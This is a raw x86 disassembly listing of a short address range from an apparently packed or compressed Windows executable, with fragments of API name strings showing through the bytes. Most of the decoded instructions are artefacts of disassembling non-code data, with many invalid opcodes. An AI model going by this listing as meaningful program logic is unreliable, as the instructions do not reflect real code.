  417ab7:	0c 52                	or     $0x52,%al
  417ab9:	ce                   	into
  417aba:	0a 5d 85             	or     -0x7b(%ebp),%bl
  417abd:	41                   	inc    %ecx
  417abe:	c8 5e 0c 5b          	enter  $0xc5e,$0x5b
  417ac2:	45                   	inc    %ebp
  417ac3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  417ac4:	c2 10 bc             	ret    $0xbc10
  417ac7:	12 27                	adc    (%edi),%ah
  417ac9:	53                   	push   %ebx
  417aca:	21 37                	and    %esi,(%edi)
  417acc:	4f                   	dec    %edi
  417acd:	f2 8c a2 e0 17 41 10 	repnz mov %fs,0x104117e0(%edx)
  417ad4:	10 41 82             	adc    %al,-0x7e(%ecx)
  417ad7:	df 48 4e             	fisttps 0x4e(%eax)
  417ada:	93                   	xchg   %eax,%ebx
  417adb:	a2 36 01 c3 d1       	mov    %al,0xd1c30136
  417ae0:	45                   	inc    %ebp
  417ae1:	80 b6 20 d7 61 07 a7 	xorb   $0xa7,0x761d720(%esi)
  417ae8:	d8 a5 e2 06 24 d9    	fsubs  -0x26dbf91e(%ebp)
  417aee:	d4 da                	aam    $0xda
  417af0:	85 90 17 13 71 10    	test   %edx,0x10711317(%eax)
  417af6:	a0 5f 84 d2 cf       	mov    0xcfd2845f,%al
  417afb:	20 1a                	and    %bl,(%edx)
  417afd:	c4 6e d1             	les    -0x2f(%esi),%ebp
  417b00:	d3 09                	rorl   %cl,(%ecx)
  417b02:	da cd                	fcmove %st(5),%st
  417b04:	b4 3f                	mov    $0x3f,%ah
  417b06:	a8 d6                	test   $0xd6,%al
  417b08:	dd 06                	fldl   (%esi)
  417b0a:	d1 c9                	ror    $1,%ecx
  417b0c:	0e                   	push   %cs
  417b0d:	dd 27                	frstor (%edi)
  417b0f:	93                   	xchg   %eax,%ebx
  417b10:	9e                   	sahf
  417b11:	84 da                	test   %bl,%dl
  417b13:	3f                   	aas
  417b14:	40                   	inc    %eax
  417b15:	ed                   	in     (%dx),%eax
  417b16:	b0 d3                	mov    $0xd3,%al
  417b18:	db 2d 21 84 b4 c9    	fldt   0xc9b48421
  417b1e:	d6                   	salc
  417b1f:	ca 12 20             	lret   $0x2012
  417b22:	26 6b 22 2e          	imul   $0x2e,%es:(%edx),%esp
  417b26:	c9                   	leave
  417b27:	1e                   	push   %ds
  417b28:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  417b29:	c4 47 e1             	les    -0x1f(%edi),%eax
  417b2c:	5e                   	pop    %esi
  417b2d:	fd                   	std
  417b2e:	b2 d3                	mov    $0xd3,%dl
  417b30:	d8 68 f5             	fsubrs -0xb(%eax)
  417b33:	d2 90 c1 5c 1b 31    	rclb   %cl,0x311b5cc1(%eax)
  417b39:	92                   	xchg   %eax,%edx
  417b3a:	a1 66 d7 46 47       	mov    0x4746d766,%eax
  417b3f:	ab                   	stos   %eax,%es:(%edi)
  417b40:	94                   	xchg   %eax,%esp
  417b41:	c7                   	(bad)
  417b42:	4b                   	dec    %ebx
  417b43:	11 a8 4c 2d 12 f1    	adc    %ebp,-0xeedd2b4(%eax)
  417b49:	b7 1e                	mov    $0x1e,%bh
  417b4b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417b4c:	d4 d4                	aam    $0xd4
  417b4e:	d0 cd                	ror    $1,%ch
  417b50:	c7                   	(bad)
  417b51:	ff 05 88 85 e2 73    	incl   0x73e28588
  417b57:	5d                   	pop    %ebp
  417b58:	9c                   	pushf
  417b59:	84 f3                	test   %dh,%bl
  417b5b:	d6                   	salc
  417b5c:	83 bd 9b 19 0f 83 18 	cmpl   $0x18,-0x7cf0e665(%ebp)
  417b63:	84 94 dc aa 00 cc 8d 	test   %dl,-0x7233ff56(%esp,%ebx,8)
  417b6a:	e2 6c                	loop   0x417bd8
  417b6c:	7b 53                	jnp    0x417bc1
  417b6e:	49                   	dec    %ecx
  417b6f:	d7                   	xlat   %ds:(%ebx)
  417b70:	8b c7                	mov    %edi,%eax
  417b72:	ea bf 06 e2 74 76 ca 	ljmp   $0xca76,$0x74e206bf
  417b79:	eb ca                	jmp    0x417b45
  417b7b:	e8 d7 d4 c2 41       	call   0x42045057
  417b80:	6c                   	insb   (%dx),%es:(%edi)
  417b81:	ed                   	in     (%dx),%eax
  417b82:	c9                   	leave
  417b83:	c7                   	(bad)
  417b84:	cd 09                	int    $0x9
  417b86:	48                   	dec    %eax
  417b87:	92                   	xchg   %eax,%edx
  417b88:	c7                   	(bad)
  417b89:	d6                   	salc
  417b8a:	36 14 25             	ss adc $0x25,%al
  417b8d:	ef                   	out    %eax,(%dx)
  417b8e:	fe ca                	dec    %dl
  417b90:	d0 c1                	rol    $1,%cl
  417b92:	0f b0 ae b5 d9 a7 2f 	cmpxchg %ch,0x2fa7d9b5(%esi)
  417b99:	df 0d 75 c9 61 b6    	fisttps 0xb661c975
  417b9f:	5d                   	pop    %ebp
  417ba0:	6b 5b 17 a5          	imul   $0xffffffa5,0x17(%ebx),%ebx
  417ba4:	39 0e                	cmp    %ecx,(%esi)
  417ba6:	f5                   	cmc
  417ba7:	c9                   	leave
  417ba8:	dc d4                	(bad)
  417baa:	d4 da                	aam    $0xda
  417bac:	1a c4                	sbb    %ah,%al
  417bae:	c7                   	(bad)
  417baf:	8d 94 9a 84 cc a5 26 	lea    0x26a5cc84(%edx,%ebx,4),%edx
  417bb6:	c7                   	(bad)
  417bb7:	76 e3                	jbe    0x417b9c
  417bb9:	af                   	scas   %es:(%edi),%eax
  417bba:	03 6f c8             	add    -0x38(%edi),%ebp
  417bbd:	84 a0 a5 9d 2c a2    	test   %ah,-0x5dd3625b(%eax)
  417bc3:	9e                   	sahf
  417bc4:	06                   	push   %es
  417bc5:	8c 6d bf             	mov    %gs,-0x41(%ebp)
  417bc8:	d1 94 e4 97 a6 aa a8 	rcll   $1,-0x57555969(%esp,%eiz,8)
  417bcf:	a2 37 aa 35 a9       	mov    %al,0xa935aa37
  417bd4:	34 2c                	xor    $0x2c,%al
  417bd6:	25 97 a9 c4 dd       	and    $0xddc4a997,%eax
  417bdb:	86 36                	xchg   %dh,(%esi)
  417bdd:	06                   	push   %es
  417bde:	43                   	inc    %ebx
  417bdf:	84 a9 67 c8 d9 a6    	test   %ch,-0x59263799(%ecx)
  417be5:	ba 42 f6 2f b4       	mov    $0xb42ff642,%edx
  417bea:	dc 1f                	fcompl (%edi)
  417bec:	09 b7 8c 94 98 8d    	or     %esi,-0x72676b74(%edi)
  417bf2:	84 8f 26 22 56 96    	test   %cl,-0x69a9ddda(%edi)
  417bf8:	c0 91 5b bd 8d d6 5e 	rclb   $0x5e,-0x297242a5(%ecx)
  417bff:	7e 9c                	jle    0x417b9d
  417c01:	9e                   	sahf
  417c02:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  417c03:	04 91                	add    $0x91,%al
  417c05:	c7                   	(bad)
  417c06:	95                   	xchg   %eax,%ebp
  417c07:	5a                   	pop    %edx
  417c08:	a9 39 0e 33 af       	test   $0xaf330e39,%eax
  417c0d:	53                   	push   %ebx
  417c0e:	8f                   	(bad)
  417c0f:	d9 14 df             	fsts   (%edi,%ebx,8)
  417c12:	ca 09 40             	lret   $0x4009
  417c15:	63 9d 14 7e b4 ec    	arpl   %ebx,-0x134b81ec(%ebp)
  417c1b:	13 c5                	adc    %ebp,%eax
  417c1d:	88 4c d5 89          	mov    %cl,-0x77(%ebp,%edx,8)
  417c21:	02 17                	add    (%edi),%dl
  417c23:	15 45 2e 19 b8       	adc    $0xb8192e45,%eax
  417c28:	3c 27                	cmp    $0x27,%al
  417c2a:	89 76 dc             	mov    %esi,-0x24(%esi)
  417c2d:	0c f4                	or     $0xf4,%al
  417c2f:	ba e8 3f a1 2c       	mov    $0x2ca13fe8,%edx
  417c34:	1b b8 1f cc 2c d1    	sbb    -0x2ed333e1(%eax),%edi
  417c3a:	8e 41 7a             	mov    0x7a(%ecx),%es
  417c3d:	38 b1 0b 44 17 91    	cmp    %dh,-0x6ee8bbf5(%ecx)
  417c43:	a8 36                	test   $0x36,%al
  417c45:	db 11                	fistl  (%ecx)
  417c47:	50                   	push   %eax
  417c48:	66 89 b3 8f e0 46 f7 	mov    %si,-0x8b91f71(%ebx)
  417c4f:	36 44                	ss inc %esp
  417c51:	a3 e4 36 6a 90       	mov    %eax,0x906a36e4
  417c56:	68 a5 48 bc 52       	push   $0x52bc48a5
  417c5b:	c5 e4 b8             	(bad)
  417c5e:	1f                   	pop    %ds
  417c5f:	41                   	inc    %ecx
  417c60:	b3 51                	mov    $0x51,%bl
  417c62:	55                   	push   %ebp
  417c63:	ef                   	out    %eax,(%dx)
  417c64:	9b                   	fwait
  417c65:	05 de 25 50 30       	add    $0x305025de,%eax
  417c6a:	6c                   	insb   (%dx),%es:(%edi)
  417c6b:	23 89 76 90 73 70    	and    0x70739076(%ecx),%ecx
  417c71:	73 8a                	jae    0x417bfd
  417c73:	54                   	push   %esp
  417c74:	b4 8c                	mov    $0x8c,%ah
  417c76:	88 87 7d 64 ab 48    	mov    %al,0x48ab647d(%edi)
  417c7c:	ef                   	out    %eax,(%dx)
  417c7d:	90                   	nop
  417c7e:	87 1f                	xchg   %ebx,(%edi)
  417c80:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  417c81:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417c82:	b8 55 17 ae 1b       	mov    $0x1bae1755,%eax
  417c87:	92                   	xchg   %eax,%edx
  417c88:	53                   	push   %ebx
  417c89:	ab                   	stos   %eax,%es:(%edi)
  417c8a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417c8b:	0f 43 b8 14 ae 59 36 	cmovae 0x3659ae14(%eax),%edi
  417c92:	db 78 45             	fstpt  0x45(%eax)
  417c95:	03 48 6c             	add    0x6c(%eax),%ecx
  417c98:	43                   	inc    %ebx
  417c99:	18 b0 0b 9b a6 33    	sbb    %dh,0x33a69b0b(%eax)
  417c9f:	dd 80 45 07 46 03    	fldl   0x3460745(%eax)
  417ca5:	e8 b8 2c 4f cb       	call   0xcb90a962
  417caa:	b3 5c                	mov    $0x5c,%bl
  417cac:	2e 3c 4e             	cs cmp $0x4e,%al
  417caf:	fc                   	cld
  417cb0:	63 cc                	arpl   %ecx,%esp
  417cb2:	6a 9c                	push   $0xffffff9c
  417cb4:	5b                   	pop    %ebx
  417cb5:	b7 59                	mov    $0x59,%bh
  417cb7:	36 e4 6b             	ss in  $0x6b,%al
  417cba:	b4 08                	mov    $0x8,%ah
  417cbc:	73 13                	jae    0x417cd1
  417cbe:	72 23                	jb     0x417ce3
  417cc0:	44                   	inc    %esp
  417cc1:	66 b9 dc 9a          	mov    $0x9adc,%cx
  417cc5:	77 76                	ja     0x417d3d
  417cc7:	07                   	pop    %es
  417cc8:	40                   	inc    %eax
  417cc9:	8f                   	(bad)
  417cca:	bc 8e 98 d0 cf       	mov    $0xcfd0988e,%esp
  417ccf:	2c bb                	sub    $0xbb,%al
  417cd1:	48                   	dec    %eax
  417cd2:	03 98 a2 50 00 70    	add    0x700050a2(%eax),%ebx
  417cd8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417cd9:	1a 6b 0d             	sbb    0xd(%ebx),%ch
  417cdc:	52                   	push   %edx
  417cdd:	8b b8 c2 a9 35 dd    	mov    -0x22ca563e(%eax),%edi
  417ce3:	2e c8 af 62 66       	cs enter $0x62af,$0x66
  417ce8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  417ce9:	12 66 e8             	adc    -0x18(%esi),%ah
  417cec:	c1 94 0e 5a 72 92 a0 	rcll   $0x6d,-0x5f6d8da6(%esi,%ecx,1)
  417cf3:	6d 
  417cf4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  417cf5:	f1                   	int1
  417cf6:	14 85                	adc    $0x85,%al
  417cf8:	6d                   	insl   (%dx),%es:(%edi)
  417cf9:	51                   	push   %ecx
  417cfa:	7b 00                	jnp    0x417cfc
  417cfc:	00 8f 8a ca 42 07    	add    %cl,0x742ca8a(%edi)
  417d02:	02 8d 60 cf d0 91    	add    -0x6e2f30a0(%ebp),%cl
  417d08:	40                   	inc    %eax
  417d09:	32 13                	xor    (%ebx),%dl
  417d0b:	a3 0b 03 97 db       	mov    %eax,0xdb97030b
  417d10:	2f                   	das
  417d11:	d8 01                	fadds  (%ecx)
  417d13:	17                   	pop    %ss
  417d14:	00 4c 1f 13          	add    %cl,0x13(%edi,%ebx,1)
  417d18:	dc 20                	fsubl  (%eax)
  417d1a:	5c                   	pop    %esp
  417d1b:	24 ff                	and    $0xff,%al
  417d1d:	6f                   	outsl  %ds:(%esi),(%dx)
  417d1e:	50                   	push   %eax
  417d1f:	37                   	aaa
  417d20:	cb                   	lret
  417d21:	cc                   	int3
  417d22:	c8 c2 c8 cd          	enter  $0xc8c2,$0xcd
  417d26:	ce                   	into
  417d27:	db d8                	fcmovnu %st(0),%st
  417d29:	da d9                	fcmovu %st(1),%st
  417d2b:	ca dc dd             	lret   $0xdddc
  417d2e:	de 0c d6             	fimuls (%esi,%edx,8)
  417d31:	6d                   	insl   (%dx),%es:(%edi)
  417d32:	f4                   	hlt
  417d33:	df e0                	fnstsw %ax
  417d35:	e1 e3                	loope  0x417d1a
  417d37:	5a                   	pop    %edx
  417d38:	e5 2f                	in     $0x2f,%eax
  417d3a:	03 57 01             	add    0x1(%edi),%edx
  417d3d:	26 15 92 ee 6b 03    	es adc $0x36bee92,%eax
  417d43:	0f 1b 83 e0 df 67 52 	bndstx %bnd0,0x5267dfe0(%ebx)
  417d4a:	75 6e                	jne    0x417dba
  417d4c:	74 69                	je     0x417db7
  417d4e:	6d                   	insl   (%dx),%es:(%edi)
  417d4f:	65 ad                	lods   %gs:(%esi),%eax
  417d51:	20 00                	and    %al,(%eax)
  417d53:	15 e0 82 fc 61       	adc    $0x61fc82e0,%eax
  417d58:	74 20                	je     0x417d7a
  417d5a:	30 1f                	xor    %bl,(%edi)
  417d5c:	85 99 88 90 ab 83    	test   %ebx,-0x7c546f78(%ecx)
  417d62:	d6                   	salc
  417d63:	00 6b cf             	add    %ch,-0x31(%ebx)
  417d66:	0d 80 03 c0 d3       	or     $0xd3c00380,%eax
  417d6b:	93                   	xchg   %eax,%ebx
  417d6c:	db d4                	fcmovnbe %st(4),%st
  417d6e:	60                   	pusha
  417d6f:	5f                   	pop    %edi
  417d70:	03 05 17 f4 0f 34    	add    0x340ff417,%eax
  417d76:	6c                   	insb   (%dx),%es:(%edi)
  417d77:	df cb                	(bad)
  417d79:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  417d7a:	3a 73 20             	cmp    0x20(%ebx),%dh
  417d7d:	6d                   	insl   (%dx),%es:(%edi)
  417d7e:	03 10                	add    (%eax),%edx
  417d80:	1b 4c 77 e0          	sbb    -0x20(%edi,%esi,2),%ecx
  417d84:	66 b9 34 b7          	mov    $0xb734,%cx
  417d88:	7e 03                	jle    0x417d8d
  417d8a:	a0 8f a2 44 c8       	mov    0xc844a28f,%al
  417d8f:	78 b6                	js     0x417d47
  417d91:	5d                   	pop    %ebp
  417d92:	d7                   	xlat   %ds:(%ebx)
  417d93:	01 cd                	add    %ecx,%ebp
  417d95:	40                   	inc    %eax
  417d96:	07                   	pop    %es
  417d97:	7c 03                	jl     0x417d9c
  417d99:	28 b1 17 3c 6a 04    	sub    %dh,0x46a3c17(%ecx)
  417d9f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  417da0:	69 cc 0c c7 14 22    	imul   $0x2214c70c,%esp,%ecx
  417da6:	28 30                	sub    %dh,(%eax)
  417da8:	e1 09                	loope  0x417db3
  417daa:	00 44 20 96          	add    %al,-0x6a(%eax,%eiz,1)
  417dae:	20 03                	and    %al,(%ebx)
  417db0:	a0 08 40 46 01       	mov    0x1464008,%al
  417db5:	54                   	push   %esp
  417db6:	90                   	nop
  417db7:	8c 02                	mov    %es,(%edx)
  417db9:	a8 e5                	test   $0xe5,%al
  417dbb:	7e 10                	jle    0x417dcd
  417dbd:	51                   	push   %ecx
  417dbe:	30 41 00             	xor    %al,0x0(%ecx)
  417dc1:	08 03                	or     %al,(%ebx)
  417dc3:	91                   	xchg   %eax,%ecx
  417dc4:	50                   	push   %eax
  417dc5:	77 54                	ja     0x417e1b
  417dc7:	fd                   	std
  417dc8:	10 40 41             	adc    %al,0x41(%eax)
  417dcb:	b9 28 b0 04 11       	mov    $0x1104b028,%ecx
  417dd0:	03 9b ff 07 20 06    	add    0x62007ff(%ebx),%ebx
  417dd6:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  417dda:	00 43 00             	add    %al,0x0(%ebx)
  417ddd:	4c                   	dec    %esp
  417dde:	00 41 0b             	add    %al,0xb(%ecx)
  417de1:	00 f1                	add    %dh,%cl
  417de3:	7f b3                	jg     0x417d98
  417de5:	b9 50 07 0d 4b       	mov    $0x4b0d0750,%ecx
  417dea:	47                   	inc    %edi
  417deb:	00 45 00             	add    %al,0x0(%ebp)
  417dee:	49                   	dec    %ecx
  417def:	00 4e 00             	add    %cl,0x0(%esi)
  417df2:	46                   	inc    %esi
  417df3:	00 4f 28             	add    %cl,0x28(%edi)
  417df6:	fe                   	(bad)
  417df7:	ff 4b 47             	decl   0x47(%ebx)
  417dfa:	26 3d 4f 38 c2 82    	es cmp $0x82c2384f,%eax
  417e00:	37                   	aaa
  417e01:	b8 f3 24 42 03       	mov    $0x34224f3,%eax
  417e06:	17                   	pop    %ss
  417e07:	9b                   	fwait
  417e08:	3a 83 ff 77 cb 25    	cmp    0x25cb77ff(%ebx),%al
  417e0e:	cb                   	lret
  417e0f:	cc                   	int3
  417e10:	00 0f                	add    %cl,(%edi)
  417e12:	04 01                	add    $0x1,%al
  417e14:	9c                   	pushf
  417e15:	50                   	push   %eax
  417e16:	6c                   	insb   (%dx),%es:(%edi)
  417e17:	75 74                	jne    0x417e8d
  417e19:	6f                   	outsl  %ds:(%esi),(%dx)
  417e1a:	6e                   	outsb  %ds:(%esi),(%dx)
  417e1b:	58                   	pop    %eax
  417e1c:	00 1c 41             	add    %bl,(%ecx,%eax,2)
  417e1f:	c4 56 fe             	les    -0x2(%esi),%edx
  417e22:	33 4d 65             	xor    0x65(%ebp),%ecx
  417e25:	73 73                	jae    0x417e9a
  417e27:	61                   	popa
  417e28:	67 15 c7 00 fe dd    	addr16 adc $0xddfe00c7,%eax
  417e2e:	60                   	pusha
  417e2f:	6a 81                	push   $0xffffff81
  417e31:	08 49 6e             	or     %cl,0x6e(%ecx)
  417e34:	69 74 00 0c 4b 57 fd 	imul   $0xfdfd574b,0xc(%eax,%eax,1),%esi
  417e3b:	fd 
  417e3c:	76 03                	jbe    0x417e41
  417e3e:	51                   	push   %ecx
  417e3f:	6f                   	outsl  %ds:(%esi),(%dx)
  417e40:	77 1c                	ja     0x417e5e
  417e42:	10 55 54             	adc    %dl,0x54(%ebp)
  417e45:	79 70                	jns    0x417eb7
  417e47:	24 38                	and    $0x38,%al
  417e49:	4d                   	dec    %ebp
  417e4a:	61                   	popa
  417e4b:	6f                   	outsl  %ds:(%esi),(%dx)
  417e4c:	b3 20                	mov    $0x20,%bl
  417e4e:	a0 12 40 a0 92       	mov    0x92a04012,%al
  417e53:	55                   	push   %ebp
  417e54:	74 e5                	je     0x417e3b
  417e56:	2f                   	das
  417e57:	ff e5                	jmp    *%ebp
  417e59:	69 6c 73 91 47 65 74 	imul   $0x50746547,-0x6f(%ebx,%esi,2),%ebp
  417e60:	50 
  417e61:	72 6f                	jb     0x417ed2
  417e63:	63 b5 4b 69 6c 6c    	arpl   %esi,0x6c6c694b(%ebp)
  417e69:	41                   	inc    %ecx
  417e6a:	e5 db                	in     $0xdb,%eax
  417e6c:	07                   	pop    %es
  417e6d:	fb                   	sti
  417e6e:	00 3c 41             	add    %bh,(%ecx,%eax,2)
  417e71:	63 6c 1d d3          	arpl   %ebp,-0x2d(%ebp,%ebx,1)
  417e75:	4c                   	dec    %esp
  417e76:	41                   	inc    %ecx
  417e77:	4e                   	dec    %esi
  417e78:	05 a0 50 32 50       	add    $0x503250a0,%eax
  417e7d:	aa                   	stos   %al,%es:(%edi)
  417e7e:	49                   	dec    %ecx
  417e7f:	82 80 f8 47 38 14 52 	addb   $0x52,0x143847f8(%eax)
  417e86:	04 89                	add    $0x89,%al
  417e88:	8a f5                	mov    %ch,%dh
  417e8a:	a8 00                	test   $0x0,%al
  417e8c:	1b 51 0a             	sbb    0xa(%ecx),%edx
  417e8f:	f2 ff 9b 83 8c a4 11 	repnz lcall *0x11a48c83(%ebx)
  417e96:	01 00                	add    %eax,(%eax)
  417e98:	01 57 72             	add    %edx,0x72(%edi)
  417e9b:	69 74 65 46 69 6c 65 	imul   $0x1c656c69,0x46(%ebp,%eiz,2),%esi
  417ea2:	1c 
  417ea3:	00 f0                	add    %dh,%al
  417ea5:	f7 53 65             	notl   0x65(%ebx)
  417ea8:	74 08                	je     0x417eb2
  417eaa:	50                   	push   %eax
  417eab:	6f                   	outsl  %ds:(%esi),(%dx)
  417eac:	69 70 98 fd ec c7 0f 	imul   $0xfc7ecfd,-0x68(%eax),%esi
  417eb3:	45                   	inc    %ebp
  417eb4:	6e                   	outsb  %ds:(%esi),(%dx)
  417eb5:	64 4f                	fs dec %edi
  417eb7:	66 1d 52 65          	sbb    $0x6552,%ax
  417ebb:	61                   	popa
  417ebc:	64 09 ec             	fs or  %ebp,%esp
  417ebf:	02 82 25 1d 56 5f    	add    0x5f561d25(%edx),%al
  417ec5:	6f                   	outsl  %ds:(%esi),(%dx)
  417ec6:	6e                   	outsb  %ds:(%esi),(%dx)
  417ec7:	82 3f 03             	cmpb   $0x3,(%edi)
  417eca:	11 25 0e 53 74 64    	adc    %esp,0x6474530e
  417ed0:	9f                   	lahf
  417ed1:	e0 c5                	loopne 0x417e98
  417ed3:	22 6e 0d             	and    0xd(%esi),%ch
  417ed6:	3a 41 64             	cmp    0x64(%ecx),%al
  417ed9:	6b 1f 2b             	imul   $0x2b,(%edi),%ebx
  417edc:	c1 64 72 8a 0f       	shll   $0xf,-0x76(%edx,%esi,2)
  417ee1:	4d                   	dec    %ebp
  417ee2:	6f                   	outsl  %ds:(%esi),(%dx)
  417ee3:	64 75 1a             	fs jne 0x417f00
  417ee6:	20 2c 80             	and    %ch,(%eax,%eax,4)
  417ee9:	7e 36                	jle    0x417f21
  417eeb:	2f                   	das
  417eec:	4c                   	dec    %esp
  417eed:	61                   	popa
  417eee:	73 74                	jae    0x417f64
  417ef0:	09 17                	or     %edx,(%edi)
  417ef2:	12 88 60 01 78 20    	adc    0x20780160(%eax),%cl
  417ef8:	37                   	aaa
  417ef9:	8b bd 35 65 29 4e    	mov    0x4e296535(%ebp),%edi
  417eff:	65 78 8c             	gs js  0x417e8e
  417f02:	0e                   	push   %cs
  417f03:	78 9f                	js     0x417ea4
  417f05:	fb                   	sti
  417f06:	81 35 6f 0f 43 6c 6f 	xorl   $0x116c736f,0x6c430f6f
  417f0d:	73 6c 11 
  417f10:	54                   	push   %esp
  417f11:	b0 61                	mov    $0x61,%al
  417f13:	b7 db                	mov    $0xdb,%bh
  417f15:	69 6d 03 6f 4c 72 61 	imul   $0x61724c6f,0x3(%ebp),%ebp
  417f1c:	6c                   	insb   (%dx),%es:(%edi)
  417f1d:	0e                   	push   %cs
  417f1e:	18 6b 00             	sbb    %ch,0x0(%ebx)
  417f21:	41                   	inc    %ecx
  417f22:	3b 44 28 1e          	cmp    0x1e(%eax,%ebp,1),%eax
  417f26:	16                   	push   %ss
  417f27:	7b 30                	jnp    0x417f59
  417f29:	d7                   	xlat   %ds:(%ebx)
  417f2a:	06                   	push   %es
  417f2b:	43                   	inc    %ebx
  417f2c:	65 0b 47 43          	or     %gs:0x43(%edi),%eax
  417f30:	6f                   	outsl  %ds:(%esi),(%dx)
  417f31:	6d                   	insl   (%dx),%es:(%edi)
  417f32:	70 bd                	jo     0x417ef1
  417f34:	17                   	pop    %ss
  417f35:	09 5a 10             	or     %ebx,0x10(%edx)
  417f38:	fd                   	std
  417f39:	0f 53 da             	rcpps  %xmm2,%xmm3
  417f3c:	66 63 98 a5 1f c8 10 	arpl   %bx,0x10c81fa5(%eax)
  417f43:	44                   	inc    %esp
  417f44:	65 0e                	gs push %cs
  417f46:	ee                   	out    %al,(%dx)
  417f47:	82 6b d8 32          	subb   $0x32,-0x28(%ebx)
  417f4b:	43                   	inc    %ebx
  417f4c:	25 69 61 12 63       	and    $0x63126169,%eax
  417f51:	74 f7                	je     0x417f4a
  417f53:	0e                   	push   %cs
  417f54:	57                   	push   %edi
  417f55:	b6 6d                	mov    $0x6d,%dh
  417f57:	16                   	push   %ss
  417f58:	4c                   	dec    %esp
  417f59:	48                   	dec    %eax
  417f5a:	76 15                	jbe    0x417f71
  417f5c:	45                   	inc    %ebp
  417f5d:	38 bb 75 41 ca 15    	cmp    %bh,0x15ca4175(%ebx)
  417f63:	7c 69                	jl     0x417fce
  417f65:	0f 69 7a 30          	punpckhwd 0x30(%edx),%mm7
  417f69:	99                   	cltd
  417f6a:	73 b7                	jae    0x417f23
  417f6c:	2b 56 d7             	sub    -0x29(%esi),%edx
  417f6f:	74 75                	je     0x417fe6
  417f71:	b8 fd 0c f6 62       	mov    $0x62f60cfd,%eax
  417f76:	6e                   	outsb  %ds:(%esi),(%dx)
  417f77:	3b 41 6c             	cmp    0x6c(%ecx),%eax
  417f7a:	88 63 61             	mov    %ah,0x61(%ebx)
  417f7d:	d1 18                	rcrl   $1,(%eax)
  417f7f:	0a 6d b7             	or     -0x49(%ebp),%ch
  417f82:	c3                   	ret
  417f83:	6c                   	insb   (%dx),%es:(%edi)
  417f84:	16                   	push   %ss
  417f85:	2f                   	das
  417f86:	cb                   	lret
  417f87:	63 6b bc             	arpl   %ebp,-0x44(%ebx)
  417f8a:	75 16                	jne    0x417fa2
  417f8c:	b6 db                	mov    $0xdb,%dh
  417f8e:	ad                   	lods   %ds:(%esi),%eax
  417f8f:	6b 0d 51 75 6f 79 50 	imul   $0x50,0x796f7551,%ecx
  417f96:	03 66 4a             	add    0x4a(%esi),%esp
  417f99:	6d                   	insl   (%dx),%es:(%edi)
  417f9a:	40                   	inc    %eax
  417f9b:	70 af                	jo     0x417f4c
  417f9d:	d0 b9 3d 16 82 a3    	sarb   $1,-0x5c7de9c3(%ecx)
  417fa3:	0d b7 f6 d8 0b       	or     $0xbd8f6b7,%eax
  417fa8:	43                   	inc    %ebx
  417fa9:	75 72                	jne    0x41801d
  417fab:	49                   	dec    %ecx
  417fac:	19 54 68 00          	sbb    %edx,0x0(%eax,%ebp,2)
  417fb0:	64 08 63 b1          	or     %ah,%fs:-0x4f(%ebx)
  417fb4:	d9 49 64             	(bad) 0x64(%ecx)
  417fb7:	46                   	inc    %esi
  417fb8:	0c 5b                	or     $0x5b,%al
  417fba:	65 c5 40 d8          	lds    %gs:-0x28(%eax),%eax
  417fbe:	5a                   	pop    %edx
  417fbf:	37                   	aaa
  417fc0:	61                   	popa
  417fc1:	80 70 ae 4d          	xorb   $0x4d,-0x52(%eax)
  417fc5:	41                   	inc    %ecx
  417fc6:	b8 b3 20 15 41       	mov    $0x411520b3,%eax
  417fcb:	33 13                	xor    (%ebx),%edx
  417fcd:	61                   	popa
  417fce:	25 cc 66 2f 23       	and    $0x232f66cc,%eax
  417fd3:	ca 53 7b             	lret   $0x7b53
  417fd6:	af                   	scas   %es:(%edi),%eax
  417fd7:	d0 9c 87 54 51 2e bd 	rcrb   $1,-0x42d1aeac(%edi,%eax,4)
  417fde:	0a 11                	or     (%ecx),%dl
  417fe0:	63 c3                	arpl   %eax,%ebx
  417fe2:	76 62                	jbe    0x418046
  417fe4:	72 56                	jb     0x41803c
  417fe6:	79 1b                	jns    0x418003
  417fe8:	78 69                	js     0x418053
  417fea:	19 1b                	sbb    %ebx,(%ebx)
  417fec:	e1 03                	loope  0x417ff1
  417fee:	e3 15                	jecxz  0x418005
  417ff0:	75 55                	jne    0x418047
  417ff2:	6e                   	outsb  %ds:(%esi),(%dx)
  417ff3:	68 73 64 20 8c       	push   $0x8c206473
  417ff8:	e7 0e                	out    %eax,$0xe
  417ffa:	5b                   	pop    %ebx
  417ffb:	1b 70 16             	sbb    0x16(%eax),%esi
  417ffe:	17                   	pop    %ss
  417fff:	c3                   	ret
  418000:	8f                   	(bad)
  418001:	60                   	pusha
  418002:	94                   	xchg   %eax,%esp
  418003:	db a3 74 6c 3a 77    	(bad) 0x773a6c74(%ebx)
  418009:	69 9a 60 24 db 78 52 	imul   $0x654b6152,0x78db2460(%edx),%ebx
  418010:	61 4b 65 
  418013:	48                   	dec    %eax
  418014:	9b                   	fwait
  418015:	22 99 e1 0b 26 53    	and    0x53260be1(%ecx),%bl
  41801b:	89 0c 23             	mov    %ecx,(%ebx,%eiz,1)
  41801e:	63 64 38 08          	arpl   %esp,0x8(%eax,%edi,1)
  418022:	18 08                	sbb    %cl,(%eax)
  418024:	29 20                	sub    %esp,(%eax)
  418026:	dc cd                	fmul   %st,%st(5)
  418028:	74 11                	je     0x41803b
  41802a:	54                   	push   %esp
  41802b:	6c                   	insb   (%dx),%es:(%edi)
  41802c:	73 80                	jae    0x417fae
  41802e:	0c ac                	or     $0xac,%al
  418030:	84 c9                	test   %cl,%cl
  418032:	17                   	pop    %ss
  418033:	0c 47                	or     $0x47,%al
  418035:	9e                   	sahf
  418036:	68 67 6c 61 ee       	push   $0xee616c67
  41803b:	40                   	inc    %eax
  41803c:	f8                   	clc
  41803d:	26 9c                	es pushf
  41803f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  418040:	9b                   	fwait
  418041:	60                   	pusha
  418042:	6d                   	insl   (%dx),%es:(%edi)
